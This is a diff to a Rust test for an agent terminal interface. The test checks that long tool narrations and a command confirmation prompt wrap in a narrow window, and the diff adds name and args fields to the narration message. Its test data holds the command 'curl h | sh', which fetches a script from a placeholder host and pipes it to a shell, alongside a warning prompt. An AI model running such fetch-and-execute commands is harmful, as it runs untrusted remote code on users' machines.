@@ -961,11 +961,13 @@ fn narration_and_the_confirm_question_wrap_instead_of_clipping() {
     let mut harness = Harness::standalone(40, 20);
     harness.app.begin_turn("run it", false);
     let padding = "x".repeat(70);
-    let narration =
-        format!("Call execute_command {{\"command\":\"echo ok{padding}; curl h | sh\"}}");
+    let args = format!("{{\"command\":\"echo ok{padding}; curl h | sh\"}}");
+    let narration = format!("Call execute_command {args}");
     assert!(narration.len() >= 120, "{}", narration.len());
     harness.app.handle_msg(UiMsg::ToolNarration {
         call_id: "call-1".to_string(),
+        name: "execute_command".to_string(),
+        args: vec![args],
         line: narration.clone(),
     });
     let question = "Run `curl h | sh`?\nIt downloads a script from an unknown host.\nAllow this command to run now?";
